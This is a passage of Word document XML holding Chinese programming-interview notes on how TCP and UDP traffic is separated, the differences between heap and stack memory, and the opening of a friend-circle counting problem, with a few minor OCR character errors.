          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>源端口目的端口、以及传输协议，在这里尽管前4项都一样，但是传输 协议是不一样的，所以内核会认为是2个不同的连接，在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>层就会进行开始分流，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">tcp </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">的走 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">tcp, udp </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">走 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>udp。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="709"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="262" w:name="bookmark273"/>
      <w:bookmarkEnd w:id="262"/>
      <w:bookmarkStart w:id="263" w:name="bookmark271"/>
      <w:bookmarkStart w:id="264" w:name="bookmark274"/>
      <w:bookmarkStart w:id="265" w:name="bookmark272"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>堆和栈的区别</w:t>
      </w:r>
      <w:bookmarkEnd w:id="263"/>
      <w:bookmarkEnd w:id="264"/>
      <w:bookmarkEnd w:id="265"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="800"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="266" w:name="bookmark275"/>
      <w:bookmarkEnd w:id="266"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>从管理方式上，</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>栈是由编译器自动</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>管理，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>无需我们手动控制；</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>对于堆，开辟和释放工作由程序员控制，所以有内存泄漏等情况的发生。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="815"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="267" w:name="bookmark276"/>
      <w:bookmarkEnd w:id="267"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>从申请大小上，</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>栈是有高地址向低地址扩展的，是一块连续的内存区域,所以栈的栈顶地址或者大小是 —开始就分配好的。在使用过程中，比如递归调用层数过多，那么就有可能造成栈溢出, 所以栈能获得的空间比较少；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>堆是向高地址扩展的，是链表组织的方式，所以有可能是不连续的，他的大小只受限于 有效的虚拟内存大小，所以堆能幵辟的空间较大。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="815"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="268" w:name="bookmark277"/>
      <w:bookmarkEnd w:id="268"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>从碎片问题上，</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>栈是没有碎片的情况，因为他有严格的出</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>入栈，不会存在一个内存块从栈的中间位置 弹出；</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>堆有碎片的情况，频繁的调用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>new/delete</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>分配释放内存，必然会造成内存碎片。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="815"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="269" w:name="bookmark278"/>
      <w:bookmarkEnd w:id="269"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>从分配方式上，</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>堆都是动态分配的</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>栈大多是静态分配的，也可以动态分配，可以由</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>alloc©</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>数分配。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="815"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="270" w:name="bookmark279"/>
      <w:bookmarkEnd w:id="270"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>从分配效率上，</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="420" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>计算机会在底层对栈提供支持，比如有专门的寄存器分配，用来存放栈的地址，压栈出 栈的指令等；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="240" w:line="635" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="271" w:name="bookmark280"/>
      <w:bookmarkEnd w:id="271"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>假如已知有</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个人和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>对好友关系(存于数字</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>r)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>。如 果两个人是直接或间接的好友(好友的好友的好友…)，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">则 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>认为他们属于同一个朋友圈，请写程序求岀这</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个人里一共 有多少个朋友圈。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="635" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>假如:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">n = 5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">m = 3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">r </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">= </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>{{1</w:t>
      </w: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000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>{2</w:t>
      </w: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000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>3}</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>{4</w:t>
      </w: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000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>5}},</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve">表示有 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>个人,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>是好友，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
